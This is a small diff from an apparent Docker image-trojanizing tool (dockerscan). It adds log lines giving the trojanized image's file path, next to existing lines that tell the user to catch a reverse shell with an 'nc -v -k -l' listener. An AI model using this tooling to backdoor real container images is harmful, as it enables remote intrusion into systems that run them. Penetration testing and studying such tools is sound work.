@@ -24,6 +24,13 @@ def launch_dockerscan_image_modify_trojanize_in_console(
         run_image_modify_trojanize_dockerscan(config)
 
         log.console("Image troyanized successful")
+        log.console("Trojanized image location:")
+        log.console("  > {}".format(
+            "{}.tar".format(os.path.abspath(config.output_image))
+            if config.output_image else
+            "{}.tar".format(
+                os.path.abspath(os.path.basename(config.image_path)))
+        ))
         log.console("To receive the reverse shell, only write:")
         log.console("  > nc -v -k -l {} {}".format(
             config.remote_addr,
